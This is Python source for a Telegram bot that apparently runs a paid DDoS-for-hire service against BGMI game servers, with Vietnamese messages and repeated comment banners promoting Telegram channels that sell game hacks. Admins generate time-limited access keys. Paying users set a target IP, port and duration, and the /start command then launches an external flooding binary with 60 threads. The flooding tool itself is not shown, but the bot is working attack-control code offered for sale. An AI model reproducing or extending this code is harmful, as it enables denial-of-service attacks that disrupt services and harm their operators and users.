#API_SAUKE
#SASUKE_FOEMAT
#BYSasUKE_API_KEY FAVDAUTCREHY
#OWNER - @BeasTxt_Sasuke
#KEY_REDEMPTION_1711
#ACCESS_KEY_1711
#FA ILED_SasUKE_1711
#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
#JOIN - @bgmisellingbuying
#CHANNEL- @StoRm_BGMI_HACKS_STORE

import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
from telegram import ReplyKeyboardMarkup, KeyboardButton  # Import these for the buttons

from keep_alive import keep_alive
keep_alive()

USER_FILE = "users.json"
KEY_FILE = "keys.json"

flooding_process = None
flooding_command = None


DEFAULT_THREADS = 60


users = {}
keys = {}


def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
#API_SAUKE
#SASUKE_FOEMAT
#BYSasUKE_API_KEY FAVDAUTCREHY
#OWNER - @BeasTxt_Sasuke
#KEY_REDEMPTION_1711
#ACCESS_KEY_1711
#FAILED_SasUKE_1711
#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
#JOIN - @bgmisellingbuying
#CHANNEL- @StoRm_BGMI_HACKS_STORE
# Command to generate keys
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key : {key}\nHết hạn: {expiration_date}"
            except ValueError:
                response = f" Nhập đúng số ngày (hours/days) "
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = f"Ad mới đc dùng 💀Trùm- @ChatGPT9008_bot..."

    await update.message.reply_text(response)

#API_SAUKE
#SASUKE_FOEMAT
#BYSasUKE_API_KEY FAVDAUTCREHY
#OWNER - @BeasTxt_Sasuke
#KEY_REDEMPTION_1711
#ACCESS_KEY_1711
#FAILED_SasUKE_1711
#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
#JOIN - @bgmisellingbuying
#CHANNEL- @StoRm_BGMI_HACKS_STORE
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅Key Đúng! Người dùng : {users[user_id]} OWNER- @BeasTxt_Sasuke..."
        else:
            response = f"Mua key ib @ChatGPT9008_bot"
    else:
        response = f"sử dụng: /redeem <key> để lấy key"

    await update.message.reply_text(response)


async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) Hết hạn{expiration_date}\n"
                except Exception:
                    response += f"- ID: {user_id} Hết hạn {expiration_date}\n"
        else:
            response = f" @@ChatGPT9008_bot ..."
    else:
        response = f"Cút Chỉ Trùm ms được dùng ! @ChatGPT9008_bot..."
    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Hết hạn key hoặc sai! Lấy key đi .")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <Ip> <Cổng> <Thời gian>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./sasuke', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Hết hạn hoặc sai key .")
        return

    if flooding_process is not None:
        await update.message.reply_text('Flooding is already running.')
        return

    if flooding_command is None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('🚀𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫...🚀')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Hết hạn hoặc sai key")
        return

    if flooding_process is None:
        await update.message.reply_text(' Ko có quá trình nào hoạt động')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑶𝑷𝑬𝑫...✅')


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('Usage: /broadcast <message>')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message)
            except Exception as e:
                print(f"Error sending message to {user}: {e}")
        response = "Message sent to all users."
    else:
        response = "Trùm ms đc dùng"
    
    await update.message.reply_text(response)


#API_SAUKE
#SASUKE_FOEMAT
#BYSasUKE_API_KEY FAVDAUTCREHY
#OWNER - @BeasTxt_Sasuke
#KEY_REDEMPTION_1711
#ACCESS_KEY_1711
#FAILED_SasUKE_1711
#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
#JOIN - @bgmisellingbuying
#CHANNEL- @StoRm_BGMI_HACKS_STORE

# Update the help_command function to include buttons
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Create buttons
    markup = ReplyKeyboardMarkup(
        [
            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
            [KeyboardButton("/stop")]
        ],
        resize_keyboard=True
    )

    # Message with options
    response = (
        " Bot  By @ChatGPT9008_bot Lệnh ở dưới :\n\n"
        "Admin Lệnh admin:\n"
        "/genkey <amount> <hours/days> - Tạo key !\n"
        "/allusers - Hiênr thij ngày của tât cả ng dùng.\n"
        "/broadcast <message> -Phát một tin nhắn tới tất cả người dùng được ủy quyền. \n\n"
        "User Commands:\n"
        "/redeem <key> - Lấy key để có quyền truy cập.\n"
        "/bgmi <target_ip> <port> <duration> -Thiết lập các thông số tấn công .\n"
        "/start - Bắt đầu tấn công .\n"
        "/stop -  Dừng tấn công .\n"
    )

    # Send message with the keyboard buttons
    await update.message.reply_text(response, reply_markup=markup)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()

#API_SAUKE
#SASUKE_FOEMAT
#BYSasUKE_API_KEY FAVDAUTCREHY
#OWNER - @BeasTxt_Sasuke
#KEY_REDEMPTION_1711
#ACCESS_KEY_1711
#FAILED_SasUKE_1711
#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
#JOIN - @bgmisellingbuying
#CHANNEL- @StoRm_BGMI_HACKS_STORE

